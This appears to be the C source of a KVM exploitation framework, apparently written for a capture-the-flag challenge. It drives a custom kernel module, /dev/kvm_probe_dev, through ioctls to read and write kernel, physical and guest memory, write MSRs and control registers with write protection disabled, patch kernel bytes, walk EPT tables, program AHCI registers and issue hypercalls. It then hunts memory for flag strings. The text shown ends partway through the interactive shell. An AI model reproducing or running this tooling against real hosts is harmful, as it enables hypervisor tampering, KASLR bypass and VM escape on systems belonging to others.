#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <getopt.h>
#include <time.h>
#include <ctype.h>
#include <signal.h>

#define DEVICE_PATH "/dev/kvm_probe_dev"
#define MAX_SYMBOL_NAME 128
#define PAGE_SIZE 4096
#define PAGE_SHIFT 12
#define SCAN_CHUNK_SIZE (4 * 1024 * 1024)

#define C_RESET   "\033[0m"
#define C_RED     "\033[31m"
#define C_GREEN   "\033[32m"
#define C_YELLOW  "\033[33m"
#define C_BLUE    "\033[34m"
#define C_CYAN    "\033[36m"
#define C_BOLD    "\033[1m"

static const char *FLAG_PATTERNS[] = {
    "flag{", "FLAG{", "CTF{", "ctf{", "KVMCTF{", "kvmctf{", "kernel{", "KERNEL{", NULL
};

/* Data Structures */
struct symbol_request { char name[MAX_SYMBOL_NAME]; unsigned long address; char description[256]; };
struct handler_info { char name[MAX_SYMBOL_NAME]; unsigned long address; char type[32]; };
struct kernel_mem_read { unsigned long kernel_addr; unsigned long length; unsigned char *user_buffer; };
struct physical_mem_read { unsigned long phys_addr; unsigned long length; unsigned char *user_buffer; };
struct guest_mem_read { unsigned long gpa; unsigned long gva; unsigned long length; unsigned char *user_buffer; int mode; };
struct mem_region { unsigned long start; unsigned long end; unsigned long step; unsigned char *buffer; size_t buffer_size; int region_type; };
struct msr_read_request { unsigned int msr; unsigned long long value; };
struct pattern_search_request { unsigned long start; unsigned long end; unsigned char pattern[16]; size_t pattern_len; unsigned long found_addr; };
struct page_table_dump { unsigned long virtual_addr; unsigned long pml4e; unsigned long pdpte; unsigned long pde; unsigned long pte; unsigned long physical_addr; unsigned int flags; };
struct guest_registers { unsigned long rax, rbx, rcx, rdx, rsi, rdi, rbp, rsp, r8, r9, r10, r11, r12, r13, r14, r15, rip, rflags, cr0, cr2, cr3, cr4, dr0, dr1, dr2, dr3, dr6, dr7; };
struct kaslr_info { unsigned long kernel_base; unsigned long kaslr_slide; unsigned long physmap_base; unsigned long vmalloc_base; unsigned long vmemmap_base; };
struct kernel_mem_write { unsigned long kernel_addr; unsigned long length; unsigned char *user_buffer; int disable_wp; };
struct physical_mem_write { unsigned long phys_addr; unsigned long length; unsigned char *user_buffer; int method; };
struct guest_mem_write { unsigned long gpa; unsigned long gva; unsigned long length; unsigned char *user_buffer; int mode; };
struct msr_write_request { unsigned int msr; unsigned long long value; };
struct cr_write_request { int cr_num; unsigned long value; unsigned long mask; };
struct memset_request { unsigned long addr; unsigned char value; unsigned long length; int addr_type; };
struct patch_request { unsigned long addr; unsigned char original[32]; unsigned char patch[32]; size_t length; int verify_original; int addr_type; };
struct addr_conv_request { unsigned long input_addr; unsigned long output_addr; int status; };
struct gpa_to_hva_request { unsigned long gpa; unsigned long hva; unsigned long gfn; int vm_fd; int status; };
struct gfn_to_hva_request { unsigned long gfn; unsigned long hva; int vm_fd; int status; };
struct gfn_to_pfn_request { unsigned long gfn; unsigned long pfn; int vm_fd; int status; };
struct hva_to_pfn_request { unsigned long hva; unsigned long pfn; int writable; int status; };
struct virt_to_phys_request { unsigned long virt_addr; unsigned long phys_addr; unsigned long pfn; unsigned long offset; int status; };
struct phys_to_virt_request { unsigned long phys_addr; unsigned long virt_addr; int use_ioremap; int status; };
struct spte_to_pfn_request { unsigned long spte; unsigned long pfn; unsigned long flags; int present; int writable; int executable; int status; };
struct ept_walk_request { unsigned long eptp; unsigned long gpa; unsigned long hpa; unsigned long pml4e; unsigned long pdpte; unsigned long pde; unsigned long pte; int page_size; int status; };
struct gva_translate_request { unsigned long gva; unsigned long gpa; unsigned long hva; unsigned long hpa; unsigned long cr3; int access_type; int status; };
struct page_to_pfn_request { unsigned long page_addr; unsigned long pfn; int status; };
struct pfn_to_page_request { unsigned long pfn; unsigned long page_addr; int status; };
struct pfn_to_hva_request { unsigned long pfn; unsigned long hva; int status; };
struct hva_to_gfn_request { unsigned long hva; unsigned long gfn; int vm_fd; int status; };
struct virt_to_pfn_request { unsigned long virt_addr; unsigned long pfn; int status; };
struct pfn_data_request { unsigned long pfn; unsigned long length; unsigned char *user_buffer; };
struct write_flush_request { unsigned long addr; unsigned long length; unsigned char *user_buffer; int addr_type; };
struct ahci_reg_request { uint32_t port; uint32_t offset; uint32_t value; int is_write; };
struct ahci_fis_request { uint32_t port; uint64_t fis_base; uint64_t clb_base; };
struct ahci_info { uint32_t cap; uint32_t ghc; uint32_t pi; uint32_t vs; uint32_t port_ssts[6]; };
struct hypercall_request { uint64_t nr; uint64_t a0; uint64_t a1; uint64_t a2; uint64_t a3; uint64_t result; };
struct hypercall_batch_request { uint64_t r100; uint64_t r101; uint64_t r102; uint64_t r103; };

/* IOCTLs */
#define IOCTL_BASE 0x4000
#define IOCTL_LOOKUP_SYMBOL (IOCTL_BASE+0x01)
#define IOCTL_GET_SYMBOL_COUNT (IOCTL_BASE+0x02)
#define IOCTL_GET_SYMBOL_BY_INDEX (IOCTL_BASE+0x03)
#define IOCTL_FIND_SYMBOL_BY_NAME (IOCTL_BASE+0x04)
#define IOCTL_GET_VMX_HANDLERS (IOCTL_BASE+0x05)
#define IOCTL_GET_SVM_HANDLERS (IOCTL_BASE+0x06)
#define IOCTL_SEARCH_SYMBOLS (IOCTL_BASE+0x07)
#define IOCTL_READ_KERNEL_MEM (IOCTL_BASE+0x10)
#define IOCTL_READ_PHYSICAL_MEM (IOCTL_BASE+0x11)
#define IOCTL_READ_GUEST_MEM (IOCTL_BASE+0x12)
#define IOCTL_SCAN_MEMORY_REGION (IOCTL_BASE+0x13)
#define IOCTL_FIND_MEMORY_PATTERN (IOCTL_BASE+0x14)
#define IOCTL_READ_CR_REGISTER (IOCTL_BASE+0x15)
#define IOCTL_READ_MSR (IOCTL_BASE+0x16)
#define IOCTL_DUMP_PAGE_TABLES (IOCTL_BASE+0x17)
#define IOCTL_READ_GUEST_REGISTERS (IOCTL_BASE+0x19)
#define IOCTL_GET_KASLR_INFO (IOCTL_BASE+0x1A)
#define IOCTL_READ_PFN_DATA (IOCTL_BASE+0x1C)
#define IOCTL_WRITE_KERNEL_MEM (IOCTL_BASE+0x20)
#define IOCTL_WRITE_PHYSICAL_MEM (IOCTL_BASE+0x21)
#define IOCTL_WRITE_GUEST_MEM (IOCTL_BASE+0x22)
#define IOCTL_WRITE_MSR (IOCTL_BASE+0x23)
#define IOCTL_WRITE_CR_REGISTER (IOCTL_BASE+0x24)
#define IOCTL_MEMSET_KERNEL (IOCTL_BASE+0x25)
#define IOCTL_MEMSET_PHYSICAL (IOCTL_BASE+0x26)
#define IOCTL_PATCH_BYTES (IOCTL_BASE+0x28)
#define IOCTL_WRITE_PHYSICAL_PFN (IOCTL_BASE+0x29)
#define IOCTL_WRITE_PHYSICAL_DIRECT (IOCTL_BASE+0x2A)
#define IOCTL_GPA_TO_HVA (IOCTL_BASE+0x30)
#define IOCTL_GFN_TO_HVA (IOCTL_BASE+0x31)
#define IOCTL_GFN_TO_PFN (IOCTL_BASE+0x32)
#define IOCTL_GPA_TO_GFN (IOCTL_BASE+0x33)
#define IOCTL_GFN_TO_GPA (IOCTL_BASE+0x34)
#define IOCTL_HVA_TO_PFN (IOCTL_BASE+0x35)
#define IOCTL_HVA_TO_GFN (IOCTL_BASE+0x36)
#define IOCTL_PFN_TO_HVA (IOCTL_BASE+0x37)
#define IOCTL_VIRT_TO_PHYS (IOCTL_BASE+0x38)
#define IOCTL_PHYS_TO_VIRT (IOCTL_BASE+0x39)
#define IOCTL_VIRT_TO_PFN (IOCTL_BASE+0x3A)
#define IOCTL_PAGE_TO_PFN (IOCTL_BASE+0x3B)
#define IOCTL_PFN_TO_PAGE (IOCTL_BASE+0x3C)
#define IOCTL_SPTE_TO_PFN (IOCTL_BASE+0x3D)
#define IOCTL_WALK_EPT (IOCTL_BASE+0x3E)
#define IOCTL_TRANSLATE_GVA (IOCTL_BASE+0x3F)
#define IOCTL_WBINVD (IOCTL_BASE+0x40)
#define IOCTL_CLFLUSH (IOCTL_BASE+0x41)
#define IOCTL_WRITE_AND_FLUSH (IOCTL_BASE+0x42)
#define IOCTL_AHCI_INIT (IOCTL_BASE+0x50)
#define IOCTL_AHCI_READ_REG (IOCTL_BASE+0x51)
#define IOCTL_AHCI_WRITE_REG (IOCTL_BASE+0x52)
#define IOCTL_AHCI_SET_FIS_BASE (IOCTL_BASE+0x53)
#define IOCTL_AHCI_INFO (IOCTL_BASE+0x54)
#define IOCTL_HYPERCALL (IOCTL_BASE+0x60)
#define IOCTL_HYPERCALL_BATCH (IOCTL_BASE+0x61)
#define IOCTL_HYPERCALL_DETECT (IOCTL_BASE+0x62)

static int g_fd = -1;
static int g_verbose = 0, g_quiet = 0, g_color = 1;
static struct { bool init; struct kaslr_info kaslr; unsigned long init_task, kernel_cr3; int hc_type; } g_sys = {0};

#define INFO(fmt, ...) do { if (!g_quiet) printf("%s[+]%s " fmt "\n", g_color?C_GREEN:"", g_color?C_RESET:"", ##__VA_ARGS__); } while(0)
#define WARN(fmt, ...) do { if (!g_quiet) printf("%s[!]%s " fmt "\n", g_color?C_YELLOW:"", g_color?C_RESET:"", ##__VA_ARGS__); } while(0)
#define ERR(fmt, ...) do { fprintf(stderr, "%s[-]%s " fmt "\n", g_color?C_RED:"", g_color?C_RESET:"", ##__VA_ARGS__); } while(0)
#define DBG(fmt, ...) do { if (g_verbose) printf("%s[*]%s " fmt "\n", g_color?C_CYAN:"", g_color?C_RESET:"", ##__VA_ARGS__); } while(0)
#define OK(fmt, ...) do { printf("%s[âœ“]%s " fmt "\n", g_color?C_GREEN C_BOLD:"", g_color?C_RESET:"", ##__VA_ARGS__); } while(0)

static void hexdump(const void *data, size_t size, unsigned long base) {
    const uint8_t *p = data;
    for (size_t i = 0; i < size; i += 16) {
        printf("%s0x%012lx%s: ", g_color?C_CYAN:"", base + i, g_color?C_RESET:"");
        for (size_t j = 0; j < 16; j++) {
            if (i + j < size) { uint8_t c = p[i + j]; printf("%02x ", c); }
            else printf("   ");
            if (j == 7) printf(" ");
        }
        printf("|");
        for (size_t j = 0; j < 16 && i + j < size; j++) { uint8_t c = p[i + j]; printf("%c", (c >= 32 && c < 127) ? c : '.'); }
        printf("|\n");
    }
}

static int dev_open(void) { if (g_fd >= 0) return 0; g_fd = open(DEVICE_PATH, O_RDWR); if (g_fd < 0) { ERR("Cannot open %s: %s", DEVICE_PATH, strerror(errno)); return -1; } return 0; }
static void dev_close(void) { if (g_fd >= 0) { close(g_fd); g_fd = -1; } }

/* Symbol Operations */
unsigned long sym_lookup(const char *name) { struct symbol_request req = {0}; if (dev_open() < 0) return 0; strncpy(req.name, name, MAX_SYMBOL_NAME-1); if (ioctl(g_fd, IOCTL_LOOKUP_SYMBOL, &req) < 0) return 0; return req.address; }
unsigned int sym_count(void) { unsigned int c = 0; if (dev_open() < 0) return 0; ioctl(g_fd, IOCTL_GET_SYMBOL_COUNT, &c); return c; }
int sym_by_index(unsigned int idx, struct symbol_request *out) { if (dev_open() < 0) return -1; memset(out, 0, sizeof(*out)); return ioctl(g_fd, IOCTL_GET_SYMBOL_BY_INDEX, &idx) < 0 ? -1 : 0; }
int sym_find(const char *pattern, struct symbol_request *out) { if (dev_open() < 0) return -1; memset(out, 0, sizeof(*out)); strncpy(out->name, pattern, MAX_SYMBOL_NAME-1); if (ioctl(g_fd, IOCTL_FIND_SYMBOL_BY_NAME, out) < 0) return -1; return out->address ? 0 : -1; }
int get_vmx_handlers(struct handler_info *h, int max) { if (dev_open() < 0) return -1; if (ioctl(g_fd, IOCTL_GET_VMX_HANDLERS, h) < 0) return -1; int c = 0; for (int i = 0; i < max && h[i].address; i++) c++; return c; }
int get_svm_handlers(struct handler_info *h, int max) { if (dev_open() < 0) return -1; if (ioctl(g_fd, IOCTL_GET_SVM_HANDLERS, h) < 0) return -1; int c = 0; for (int i = 0; i < max && h[i].address; i++) c++; return c; }

/* Memory Read */
int mem_read_kernel(unsigned long addr, void *buf, size_t len) { struct kernel_mem_read req = {addr, len, buf}; if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_READ_KERNEL_MEM, &req) < 0 ? -1 : 0; }
int mem_read_physical(unsigned long addr, void *buf, size_t len) { struct physical_mem_read req = {addr, len, buf}; if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_READ_PHYSICAL_MEM, &req) < 0 ? -1 : 0; }
int mem_read_guest(unsigned long gpa, void *buf, size_t len, int mode) { struct guest_mem_read req = {gpa, 0, len, buf, mode}; if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_READ_GUEST_MEM, &req) < 0 ? -1 : 0; }
int mem_scan_region(unsigned long start, unsigned long end, unsigned long step, void *buf, size_t buf_sz, int type) { struct mem_region req = {start, end, step, buf, buf_sz, type}; if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_SCAN_MEMORY_REGION, &req) < 0 ? -1 : 0; }
int mem_find_pattern(unsigned long start, unsigned long end, const void *pat, size_t plen, unsigned long *found) { struct pattern_search_request req = {start, end, {0}, plen, 0}; if (plen > 16) return -1; memcpy(req.pattern, pat, plen); if (dev_open() < 0) return -1; if (ioctl(g_fd, IOCTL_FIND_MEMORY_PATTERN, &req) < 0) return -1; *found = req.found_addr; return req.found_addr ? 0 : -1; }
int read_cr(int cr, unsigned long *val) { struct cr_write_request req = {cr, 0, 0}; if (dev_open() < 0) return -1; if (ioctl(g_fd, IOCTL_READ_CR_REGISTER, &req) < 0) return -1; *val = req.value; return 0; }
int read_msr(unsigned int msr, uint64_t *val) { struct msr_read_request req = {msr, 0}; if (dev_open() < 0) return -1; if (ioctl(g_fd, IOCTL_READ_MSR, &req) < 0) return -1; *val = req.value; return 0; }
int dump_page_tables(unsigned long vaddr, struct page_table_dump *out) { if (dev_open() < 0) return -1; out->virtual_addr = vaddr; return ioctl(g_fd, IOCTL_DUMP_PAGE_TABLES, out) < 0 ? -1 : 0; }
int read_guest_regs(struct guest_registers *regs) { if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_READ_GUEST_REGISTERS, regs) < 0 ? -1 : 0; }
int get_kaslr_info(struct kaslr_info *info) { if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_GET_KASLR_INFO, info) < 0 ? -1 : 0; }
int read_pfn_data(unsigned long pfn, void *buf, size_t len) { struct pfn_data_request req = {pfn, len, buf}; if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_READ_PFN_DATA, &req) < 0 ? -1 : 0; }

/* Memory Write */
int mem_write_kernel(unsigned long addr, const void *buf, size_t len, int wp) { struct kernel_mem_write req = {addr, len, (void*)buf, wp}; if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_WRITE_KERNEL_MEM, &req) < 0 ? -1 : 0; }
int mem_write_physical(unsigned long addr, const void *buf, size_t len, int method) { struct physical_mem_write req = {addr, len, (void*)buf, method}; if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_WRITE_PHYSICAL_MEM, &req) < 0 ? -1 : 0; }
int mem_write_guest(unsigned long gpa, const void *buf, size_t len, int mode) { struct guest_mem_write req = {gpa, 0, len, (void*)buf, mode}; if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_WRITE_GUEST_MEM, &req) < 0 ? -1 : 0; }
int write_msr(unsigned int msr, uint64_t val) { struct msr_write_request req = {msr, val}; if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_WRITE_MSR, &req) < 0 ? -1 : 0; }
int write_cr(int cr, unsigned long val, unsigned long mask) { struct cr_write_request req = {cr, val, mask}; if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_WRITE_CR_REGISTER, &req) < 0 ? -1 : 0; }
int mem_set_kernel(unsigned long addr, uint8_t val, size_t len) { struct memset_request req = {addr, val, len, 0}; if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_MEMSET_KERNEL, &req) < 0 ? -1 : 0; }
int mem_set_physical(unsigned long addr, uint8_t val, size_t len) { struct memset_request req = {addr, val, len, 1}; if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_MEMSET_PHYSICAL, &req) < 0 ? -1 : 0; }
int mem_patch(unsigned long addr, const void *orig, const void *patch, size_t len, int verify, int type) { struct patch_request req = {addr, {0}, {0}, len > 32 ? 32 : len, verify, type}; if (orig) memcpy(req.original, orig, req.length); memcpy(req.patch, patch, req.length); if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_PATCH_BYTES, &req) < 0 ? -1 : 0; }
int mem_write_pfn(unsigned long pfn, const void *buf, size_t len) { struct physical_mem_write req = {pfn << PAGE_SHIFT, len, (void*)buf, 0}; if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_WRITE_PHYSICAL_PFN, &req) < 0 ? -1 : 0; }
int mem_write_direct(unsigned long addr, const void *buf, size_t len) { struct physical_mem_write req = {addr, len, (void*)buf, 0}; if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_WRITE_PHYSICAL_DIRECT, &req) < 0 ? -1 : 0; }

/* Address Conversion */
int conv_gpa_to_hva(unsigned long gpa, unsigned long *hva) { struct gpa_to_hva_request req = {gpa,0,0,0,0}; if (dev_open() < 0) return -1; if (ioctl(g_fd, IOCTL_GPA_TO_HVA, &req) < 0) return -1; *hva = req.hva; return req.status; }
int conv_gfn_to_hva(unsigned long gfn, unsigned long *hva) { struct gfn_to_hva_request req = {gfn,0,0,0}; if (dev_open() < 0) return -1; if (ioctl(g_fd, IOCTL_GFN_TO_HVA, &req) < 0) return -1; *hva = req.hva; return req.status; }
int conv_gfn_to_pfn(unsigned long gfn, unsigned long *pfn) { struct gfn_to_pfn_request req = {gfn,0,0,0}; if (dev_open() < 0) return -1; if (ioctl(g_fd, IOCTL_GFN_TO_PFN, &req) < 0) return -1; *pfn = req.pfn; return req.status; }
int conv_gpa_to_gfn(unsigned long gpa, unsigned long *gfn) { struct addr_conv_request req = {gpa,0,0}; if (dev_open() < 0) return -1; if (ioctl(g_fd, IOCTL_GPA_TO_GFN, &req) < 0) return -1; *gfn = req.output_addr; return req.status; }
int conv_gfn_to_gpa(unsigned long gfn, unsigned long *gpa) { struct addr_conv_request req = {gfn,0,0}; if (dev_open() < 0) return -1; if (ioctl(g_fd, IOCTL_GFN_TO_GPA, &req) < 0) return -1; *gpa = req.output_addr; return req.status; }
int conv_hva_to_pfn(unsigned long hva, unsigned long *pfn) { struct hva_to_pfn_request req = {hva,0,0,0}; if (dev_open() < 0) return -1; if (ioctl(g_fd, IOCTL_HVA_TO_PFN, &req) < 0) return -1; *pfn = req.pfn; return req.status; }
int conv_hva_to_gfn(unsigned long hva, unsigned long *gfn) { struct hva_to_gfn_request req = {hva,0,0,0}; if (dev_open() < 0) return -1; if (ioctl(g_fd, IOCTL_HVA_TO_GFN, &req) < 0) return -1; *gfn = req.gfn; return req.status; }
int conv_pfn_to_hva(unsigned long pfn, unsigned long *hva) { struct pfn_to_hva_request req = {pfn,0,0}; if (dev_open() < 0) return -1; if (ioctl(g_fd, IOCTL_PFN_TO_HVA, &req) < 0) return -1; *hva = req.hva; return req.status; }
int conv_virt_to_phys(unsigned long virt, unsigned long *phys, unsigned long *pfn) { struct virt_to_phys_request req = {virt,0,0,0,0}; if (dev_open() < 0) return -1; if (ioctl(g_fd, IOCTL_VIRT_TO_PHYS, &req) < 0) return -1; if (phys) *phys = req.phys_addr; if (pfn) *pfn = req.pfn; return req.status; }
int conv_phys_to_virt(unsigned long phys, unsigned long *virt) { struct phys_to_virt_request req = {phys,0,0,0}; if (dev_open() < 0) return -1; if (ioctl(g_fd, IOCTL_PHYS_TO_VIRT, &req) < 0) return -1; *virt = req.virt_addr; return req.status; }
int conv_virt_to_pfn(unsigned long virt, unsigned long *pfn) { struct virt_to_pfn_request req = {virt,0,0}; if (dev_open() < 0) return -1; if (ioctl(g_fd, IOCTL_VIRT_TO_PFN, &req) < 0) return -1; *pfn = req.pfn; return req.status; }
int conv_page_to_pfn(unsigned long page, unsigned long *pfn) { struct page_to_pfn_request req = {page,0,0}; if (dev_open() < 0) return -1; if (ioctl(g_fd, IOCTL_PAGE_TO_PFN, &req) < 0) return -1; *pfn = req.pfn; return req.status; }
int conv_pfn_to_page(unsigned long pfn, unsigned long *page) { struct pfn_to_page_request req = {pfn,0,0}; if (dev_open() < 0) return -1; if (ioctl(g_fd, IOCTL_PFN_TO_PAGE, &req) < 0) return -1; *page = req.page_addr; return req.status; }
int conv_spte_to_pfn(unsigned long spte, struct spte_to_pfn_request *out) { if (dev_open() < 0) return -1; out->spte = spte; if (ioctl(g_fd, IOCTL_SPTE_TO_PFN, out) < 0) return -1; return out->status; }
int conv_walk_ept(unsigned long eptp, unsigned long gpa, struct ept_walk_request *out) { if (dev_open() < 0) return -1; out->eptp = eptp; out->gpa = gpa; if (ioctl(g_fd, IOCTL_WALK_EPT, out) < 0) return -1; return out->status; }
int conv_translate_gva(unsigned long gva, unsigned long cr3, struct gva_translate_request *out) { if (dev_open() < 0) return -1; out->gva = gva; out->cr3 = cr3; if (ioctl(g_fd, IOCTL_TRANSLATE_GVA, out) < 0) return -1; return out->status; }

/* Cache */
int cache_wbinvd(void) { if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_WBINVD, NULL) < 0 ? -1 : 0; }
int cache_clflush(unsigned long addr) { if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_CLFLUSH, &addr) < 0 ? -1 : 0; }
int cache_write_flush(unsigned long addr, const void *buf, size_t len, int type) { struct write_flush_request req = {addr, len, (void*)buf, type}; if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_WRITE_AND_FLUSH, &req) < 0 ? -1 : 0; }

/* AHCI */
int ahci_init(void) { if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_AHCI_INIT, NULL) < 0 ? -1 : 0; }
int ahci_read_reg(uint32_t port, uint32_t off, uint32_t *val) { struct ahci_reg_request req = {port, off, 0, 0}; if (dev_open() < 0) return -1; if (ioctl(g_fd, IOCTL_AHCI_READ_REG, &req) < 0) return -1; *val = req.value; return 0; }
int ahci_write_reg(uint32_t port, uint32_t off, uint32_t val) { struct ahci_reg_request req = {port, off, val, 1}; if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_AHCI_WRITE_REG, &req) < 0 ? -1 : 0; }
int ahci_set_fis(uint32_t port, uint64_t fis, uint64_t clb) { struct ahci_fis_request req = {port, fis, clb}; if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_AHCI_SET_FIS_BASE, &req) < 0 ? -1 : 0; }
int ahci_info(struct ahci_info *info) { if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_AHCI_INFO, info) < 0 ? -1 : 0; }

/* Hypercalls */
uint64_t hc_call(uint64_t nr, uint64_t a0, uint64_t a1, uint64_t a2, uint64_t a3) { struct hypercall_request req = {nr, a0, a1, a2, a3, 0}; if (dev_open() < 0) return -1; if (ioctl(g_fd, IOCTL_HYPERCALL, &req) < 0) return -1; return req.result; }
int hc_batch(struct hypercall_batch_request *b) { if (dev_open() < 0) return -1; memset(b, 0, sizeof(*b)); return ioctl(g_fd, IOCTL_HYPERCALL_BATCH, b) < 0 ? -1 : 0; }
int hc_detect(int *type) { if (dev_open() < 0) return -1; return ioctl(g_fd, IOCTL_HYPERCALL_DETECT, type) < 0 ? -1 : 0; }

/* High-level functions */
int init_sysinfo(void) { if (g_sys.init) return 0; get_kaslr_info(&g_sys.kaslr); g_sys.init_task = sym_lookup("init_task"); read_cr(3, &g_sys.kernel_cr3); hc_detect(&g_sys.hc_type); g_sys.init = true; return 0; }

void print_sysinfo(void) {
    init_sysinfo();
    printf("\n%s=== System Information ===%s\n\n", g_color?C_BOLD:"", g_color?C_RESET:"");
    printf("Kernel Base:     0x%016lx\n", g_sys.kaslr.kernel_base);
    printf("KASLR Slide:     0x%016lx\n", g_sys.kaslr.kaslr_slide);
    printf("Physmap Base:    0x%016lx\n", g_sys.kaslr.physmap_base);
    printf("vmalloc Base:    0x%016lx\n", g_sys.kaslr.vmalloc_base);
    printf("vmemmap Base:    0x%016lx\n", g_sys.kaslr.vmemmap_base);
    printf("init_task:       0x%016lx\n", g_sys.init_task);
    printf("Kernel CR3:      0x%016lx\n", g_sys.kernel_cr3);
    printf("HC Type:         %d (%s)\n", g_sys.hc_type, g_sys.hc_type==1?"VMCALL":g_sys.hc_type==2?"VMMCALL":"Unknown");
}

int hunt_flags(unsigned long start, unsigned long size, int phys) {
    uint8_t *buf = malloc(SCAN_CHUNK_SIZE); if (!buf) return -1;
    int found = 0; unsigned long end = start + size;
    INFO("Scanning %s memory 0x%lx - 0x%lx (%lu MB)...", phys?"physical":"kernel", start, end, size/(1024*1024));
    for (unsigned long addr = start; addr < end; addr += SCAN_CHUNK_SIZE) {
        size_t chunk = (addr + SCAN_CHUNK_SIZE > end) ? (end - addr) : SCAN_CHUNK_SIZE;
        int ret = phys ? mem_read_physical(addr, buf, chunk) : mem_read_kernel(addr, buf, chunk);
        if (ret < 0) continue;
        for (int p = 0; FLAG_PATTERNS[p]; p++) {
            size_t plen = strlen(FLAG_PATTERNS[p]);
            for (size_t i = 0; i + plen <= chunk; i++) {
                if (memcmp(buf + i, FLAG_PATTERNS[p], plen) == 0) {
                    printf("\n%s[FLAG]%s at 0x%lx:\n", g_color?C_GREEN C_BOLD:"", g_color?C_RESET:"", addr + i);
                    hexdump(buf + i, 64, addr + i); found++;
                }
            }
        }
        if (!g_quiet && ((addr - start) % (64*1024*1024) == 0)) { printf("\r  %lu MB, %d found", (addr-start)/(1024*1024), found); fflush(stdout); }
    }
    if (!g_quiet) printf("\n"); free(buf); return found;
}

int extract_hc_flags(void) {
    printf("\n%s=== Hypercall Flag Extraction ===%s\n\n", g_color?C_BOLD:"", g_color?C_RESET:"");
    struct hypercall_batch_request b;
    if (hc_batch(&b) == 0) {
        printf("HC 100: 0x%016lx", b.r100); if (b.r100 && b.r100 != (uint64_t)-1) { uint8_t *x = (uint8_t*)&b.r100; int ok=1; for(int i=0;i<8&&x[i];i++) if(x[i]<0x20||x[i]>0x7e) ok=0; if(ok&&x[0]) printf(" \"%.8s\"", x); } printf("\n");
        printf("HC 101: 0x%016lx\n", b.r101);
        printf("HC 102: 0x%016lx\n", b.r102);
        printf("HC 103: 0x%016lx\n", b.r103);
    }
    printf("\nTrying offsets:\n");
    for (int off = 0; off < 64; off += 8) { uint64_t r = hc_call(100, off, 0, 0, 0); if (r && r != (uint64_t)-1 && r != (uint64_t)-38) printf("  HC 100 (off=%d): 0x%016lx\n", off, r); }
    return 0;
}

static unsigned long parse_addr(const char *s) { return strtoull(s, NULL, 0); }
static size_t parse_size(const char *s) { char *e; size_t v = strtoul(s, &e, 0); if (*e=='k'||*e=='K') v*=1024; else if (*e=='m'||*e=='M') v*=1024*1024; return v; }
static int hex_to_bytes(const char *hex, uint8_t *out, size_t max) { size_t len = strlen(hex); if (len%2) return -1; size_t b = len/2; if (b>max) b=max; for(size_t i=0;i<b;i++) { unsigned int x; if (sscanf(hex+i*2,"%2x",&x)!=1) return -1; out[i]=x; } return b; }

void shell_help(void) {
    printf("\n%sCommands:%s\n", g_color?C_BOLD:"", g_color?C_RESET:"");
    printf("%s-- Memory --%s  rk/rp/rg <addr> [len], rpfn <pfn>, wk/wp/wg <addr> <hex>, fill <addr> <val> <len>, patch <addr> <hex>\n", g_color?C_CYAN:"", g_color?C_RESET:"");
    printf("%s-- Regs --%s    cr <0-4>, wcr <n> <v>, msr <n>, wmsr <n> <v>, pt <va>, gregs\n", g_color?C_CYAN:"", g_color?C_RESET:"");
    printf("%s-- Convert --%s v2p, p2v, v2pfn, gpa2hva, gfn2hva, gfn2pfn, hva2pfn, pfn2hva, page2pfn, pfn2page, spte, ept, gva\n", g_color?C_CYAN:"", g_color?C_RESET:"");
    printf("%s-- Symbols --%s sym <n>, syms, symf <pat>, vmx, svm\n", g_color?C_CYAN:"", g_color?C_RESET:"");
    printf("%s-- Hyper --%s   hc <nr> [a0-3], hcb, hcd, hcs <s> <e>\n", g_color?C_CYAN:"", g_color?C_RESET:"");
    printf("%s-- AHCI --%s    ainit, ainfo, ar <p> <o>, aw <p> <o> <v>, afis <p> <fis> [clb]\n", g_color?C_CYAN:"", g_color?C_RESET:"");
    printf("%s-- Cache --%s   wbinvd, clflush <addr>, wflush <addr> <hex>\n", g_color?C_CYAN:"", g_color?C_RESET:"");
    printf("%s-- Exploit --%s sysinfo, hunt [s] [sz], huntk, hcflags, exploit, q\n", g_color?C_CYAN:"", g_color?C_RESET:"");
}

void interactive_shell(void) {
    char line[1024]; char *cmd, *a1, *a2, *a3, *a4;
    printf("\n%sKVM Exploit Framework - Interactive Shell%s\nType 'help' for commands, 'q' to quit\n\n", g_color?C_BOLD:"", g_color?C_RESET:"");
    while (1) {
        printf("%skvm>%s ", g_color?C_CYAN:"", g_color?C_RESET:""); fflush(stdout);
        if (!fgets(line, sizeof(line), stdin)) break;
        line[strcspn(line, "\n")] = 0;
        cmd = strtok(line, " \t"); if (!cmd) continue;
        a1 = strtok(NULL, " \t"); a2 = strtok(NULL, " \t"); a3 = strtok(NULL, " \t"); a4 = strtok(NULL, " \t");
        
        if (!strcmp(cmd,"q")||!strcmp(cmd,"quit")||!strcmp(cmd,"exit")) break;
        else if (!strcmp(cmd,"help")||!strcmp(cmd,"?")) shell_help();
        else if (!strcmp(cmd,"rk") && a1) { unsigned long addr=parse_addr(a1); size_t len=a2?parse_size(a2):64; uint8_t *buf=malloc(len); if(buf&&mem_read_kernel(addr,buf,len)==0) hexdump(buf,len,addr); else ERR("Read failed"); free(buf); }
